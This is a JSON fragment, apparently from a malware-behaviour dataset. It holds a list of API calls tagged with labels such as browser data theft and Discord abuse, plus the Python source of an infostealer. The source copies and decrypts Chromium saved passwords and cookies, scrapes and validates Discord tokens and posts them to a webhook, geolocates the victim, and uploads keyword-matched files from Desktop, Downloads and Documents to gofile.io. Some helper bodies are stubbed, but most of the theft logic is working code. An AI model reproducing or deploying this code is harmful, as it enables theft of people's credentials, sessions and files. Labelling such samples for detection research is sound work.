          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "checkToken",
          "id": "check_discord_token",
          "description": "Checks validity of Discord token",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_control"
        },
        {
          "api_name": "uploadToken",
          "id": "send_discord_webhook",
          "description": "Sends message to Discord channel via webhook",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_message_operations"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "json.loads",
          "id": "deserialize_from_json",
          "description": "Deserializes JSON string to Python object",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "specific_format_encoding"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "CryptUnprotectData",
          "id": "decrypt_dpapi_data",
          "description": "Decrypts Windows DPAPI-encrypted data",
          "first_id": "encryption_hashing",
          "second_id": "encryption_operations",
          "third_id": "decryption_execution"
        },
        {
          "api_name": "os.listdir",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "re.findall",
          "id": "compile_regex",
          "description": "Compiles regular expression pattern",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "DecryptValue",
          "id": "decrypt_chromium_cookies",
          "description": "Decrypts Chromium-based browser cookies for specified domain",
          "first_id": "information_gathering",
          "second_id": "browser_data_theft",
          "third_id": "cookie_theft"
        },
        {
          "api_name": "checkToken",
          "id": "check_discord_token",
          "description": "Checks validity of Discord token",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_control"
        },
        {
          "api_name": "uploadToken",
          "id": "send_discord_webhook",
          "description": "Sends message to Discord channel via webhook",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_message_operations"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "requests.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "os.listdir",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "os.path.isfile",
          "id": "check_file_is_file",
          "description": "Checks if specified path exists and is a file",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "uploadToAnonfiles",
          "id": "upload_file_transfer_sh",
          "description": "Uploads file to transfer.sh and returns URL",
          "first_id": "network_file_transfer",
          "second_id": "file_upload",
          "third_id": "remote_service_upload"
        },
        {
          "api_name": "os.path.isdir",
          "id": "check_directory_exists",
          "description": "Checks if specified path exists and is a directory",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.listdir",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "os.path.isfile",
          "id": "check_file_is_file",
          "description": "Checks if specified path exists and is a file",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "uploadToAnonfiles",
          "id": "upload_file_transfer_sh",
          "description": "Uploads file to transfer.sh and returns URL",
          "first_id": "network_file_transfer",
          "second_id": "file_upload",
          "third_id": "remote_service_upload"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "threading.Thread",
          "id": "create_thread",
          "description": "Creates new thread to execute target function",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_creation"
        },
        {
          "api_name": "threading.Thread.start",
          "id": "start_thread",
          "description": "Starts thread execution",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        },
        {
          "api_name": "threading.Thread.join",
          "id": "wait_thread",
          "description": "Waits for thread to finish execution",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        },
        {
          "api_name": "time.sleep",
          "id": "suspend_execution",
          "description": "Suspends execution for specified seconds",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        },
        {
          "api_name": "upload",
          "id": "send_discord_webhook",
          "description": "Sends message to Discord channel via webhook",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_message_operations"
        }
      ],
      "contextual_code": "import os\nimport shutil\nimport threading\nimport time\nimport re\nimport json\nimport base64\nfrom base64 import b64decode\nfrom json import loads as json_loads\nfrom sqlite3 import connect as sql_connect\nfrom urllib.request import Request, urlopen\n\n# Helper to get public IP\n\ndef getip():\n    ip = \"None\"\n    try:\n        ip = urlopen(Request(\"https://api.ipify.org\")).read().decode().strip()\n    except:\n        pass\n    return ip\n\n# Crypto helpers for decrypting browser data\n\ndef CryptUnprotectData(encrypted_bytes, entropy=b''):\n    # ...\n    pass\n\ndef DecryptValue(buff, master_key=None):\n    # ...\n    pass\n\n# Exfiltration via Discord webhook\n\ndef LoadUrlib(hook, data='', files='', headers=''):\n    for i in range(8):\n        try:\n            if headers != '':\n                r = urlopen(Request(hook, data=data, headers=headers))\n                return r\n            else:\n                r = urlopen(Request(hook, data=data))\n                return r\n        except: \n            pass\n\ndef globalInfo():\n    ip = getip()\n    username = os.getenv(\"USERNAME\")\n    ipdatanojson = urlopen(Request(f\"https://geolocation-db.com/jsonp/{ip}\")).read().decode().replace('callback(', '').replace('})', '}')\n    ipdata = json.loads(ipdatanojson)\n    contry = ipdata[\"country_name\"]\n    contryCode = ipdata[\"country_code\"].lower()\n    globalinfo = f\":flag_{contryCode}:  - `{username.upper()} | {ip} ({contry})`\"\n    return globalinfo\n\n# Token exfiltration\n\ndef GetTokenInfo(token):\n    headers = {\n        \"Authorization\": token,\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n    }\n    userjson = json.loads(urlopen(Request(\"https://discordapp.com/api/v6/users/@me\", headers=headers)).read().decode())\n    # ...\n    return username, hashtag, email, idd, pfp, flags, nitro, phone\n\ndef checkToken(token):\n    headers = {\n        \"Authorization\": token,\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n    }\n    try:\n        urlopen(Request(\"https://discordapp.com/api/v6/users/@me\", headers=headers))\n        return True\n    except:\n        return False\n\ndef uploadToken(token, path):\n    global hook\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n    }\n    username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)\n    # ...\n    data = {\n        # ...\n    }\n    LoadUrlib(hook, data=json.dumps(data).encode(), headers=headers)\n\n# Browser data stealing (passwords, cookies, etc)\n\ndef getPassw(path, arg):\n    if not os.path.exists(path): return\n    pathC = path + arg + \"/Login Data\"\n    if os.stat(pathC).st_size == 0: return\n    tempfold = os.getenv(\"TEMP\") + \"wp\" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + \".db\"\n    shutil.copy2(pathC, tempfold)\n    conn = sql_connect(tempfold)\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT action_url, username_value, password_value FROM logins;\")\n    data = cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n    pathKey = path + \"/Local State\"\n    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())\n    master_key = b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key = CryptUnprotectData(master_key[5:])\n    for row in data: \n        if row[0] != '':\n            Passw.append(f\"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}\")\n            PasswCount += 1\n    writeforfile(Passw, 'passw')\n\ndef getCookie(path, arg):\n    if not os.path.exists(path): return\n    pathC = path + arg + \"/Cookies\"\n    if os.stat(pathC).st_size == 0: return\n    tempfold = os.getenv(\"TEMP\") + \"wp\" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + \".db\"\n    shutil.copy2(pathC, tempfold)\n    conn = sql_connect(tempfold)\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT host_key, name, encrypted_value FROM cookies\")\n    data = cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n    pathKey = path + \"/Local State\"\n    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())\n    master_key = b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key = CryptUnprotectData(master_key[5:])\n    for row in data: \n        if row[0] != '':\n            Cookies.append(f\"H057 K3Y: {row[0]} | N4M3: {row[1]} | V41U3: {DecryptValue(row[2], master_key)}\")\n            CookiCount += 1\n    writeforfile(Cookies, 'cook')\n\ndef getToken(path, arg):\n    if not os.path.exists(path): return\n    path += arg\n    for file in os.listdir(path):\n        if file.endswith(\".log\") or file.endswith(\".ldb\"):\n            for line in [x.strip() for x in open(f\"{path}\\\\{file}\", errors=\"ignore\").readlines() if x.strip()]:\n                for regex in (r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}\", r\"mfa\\.[\\w-]{80,95}\"):\n                    for token in re.findall(regex, line):\n                        global Tokens\n                        if checkToken(token):\n                            if not token in Tokens:\n                                Tokens += token\n                                uploadToken(token, path)\n\ndef GetDiscord(path, arg):\n    if not os.path.exists(f\"{path}/Local State\"): return\n    pathC = path + arg\n    pathKey = path + \"/Local State\"\n    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())\n    master_key = b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key = CryptUnprotectData(master_key[5:])\n    for file in os.listdir(pathC):\n        if file.endswith(\".log\") or file.endswith(\".ldb\"):\n            for line in [x.strip() for x in open(f\"{pathC}\\\\{file}\", errors=\"ignore\").readlines() if x.strip()]:\n                for token in re.findall(r\"dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\\\"]*\", line):\n                    global Tokens\n                    tokenDecoded = DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)\n                    if checkToken(tokenDecoded):\n                        if not tokenDecoded in Tokens:\n                            Tokens += tokenDecoded\n                            uploadToken(tokenDecoded, path)\n\ndef uploadToAnonfiles(path):\n    try:\n        return requests.post(f'https://{requests.get(\"https://api.gofile.io/getServer\").json()[\"data\"][\"server\"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()[\"data\"][\"downloadPage\"]\n    except:\n        return False\n\ndef KiwiFile(path, keywords):\n    listOfFile = os.listdir(path)\n    for file in listOfFile:\n        for worf in keywords:\n            if worf in file.lower():\n                if os.path.isfile(path + \"/\" + file) and \".txt\" in file:\n                    fifound.append([path + \"/\" + file, uploadToAnonfiles(path + \"/\" + file)])\n                    break\n                if os.path.isdir(path + \"/\" + file):\n                    target = path + \"/\" + file\n                    KiwiFolder(target, keywords)\n                    break\n\ndef KiwiFolder(pathF, keywords):\n    listOfFile = os.listdir(pathF)\n    for file in listOfFile:\n        if not os.path.isfile(pathF + \"/\" + file): return\n        url = uploadToAnonfiles(pathF + \"/\" + file)\n        # ...\n\ndef Kiwi():\n    user = os.getenv(\"TEMP\").split(\"\\AppData\")[0]\n    path2search = [\n        user + \"/Desktop\",\n        user + \"/Downloads\",\n        user + \"/Documents\"\n    ]\n    key_wordsFiles = [ ... ]\n    wikith = []\n    for patt in path2search: \n        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()\n        wikith.append(kiwi)\n    return wikith\n\ndef GatherAll():\n    # ...\n    for thread in ThCokk: thread.join()\n    for thread in Threadlist: \n        thread.join()\n    wikith = Kiwi()\n    for thread in wikith: thread.join()\n    time.sleep(0.2)\n    upload(\"kiwi\", filetext)\n\nGatherAll()"
    }
  }
]